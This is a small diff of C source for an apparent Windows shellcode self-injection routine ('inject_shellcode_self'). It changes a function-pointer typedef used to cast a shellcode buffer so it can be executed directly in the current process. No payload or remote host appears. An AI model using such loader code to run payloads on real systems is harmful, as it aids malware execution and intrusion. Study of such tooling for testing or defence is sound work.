@@ -89,7 +89,7 @@ LPVOID inject_shellcode_self(unsigned char shellcode[], SIZE_T size, PHANDLE phT
     #endif
 
     #if defined(SELFINJECT) && defined(RX) && defined(_TEXT_)
-        typedef int (*funcPtr)();
+        typedef void* (*funcPtr)();
         funcPtr func = (funcPtr)shellcode;
         *phThread = 0;
         #ifdef _DEBUG_
@@ -213,7 +213,7 @@ LPVOID inject_shellcode_self(unsigned char shellcode[], SIZE_T size, PHANDLE phT
         #endif
 
         #ifdef SELFINJECT
-            typedef int (*funcPtr)();
+            typedef void* (*funcPtr)();
             funcPtr func = (funcPtr)allocation;
             *phThread = 0;
             #ifdef _DEBUG_
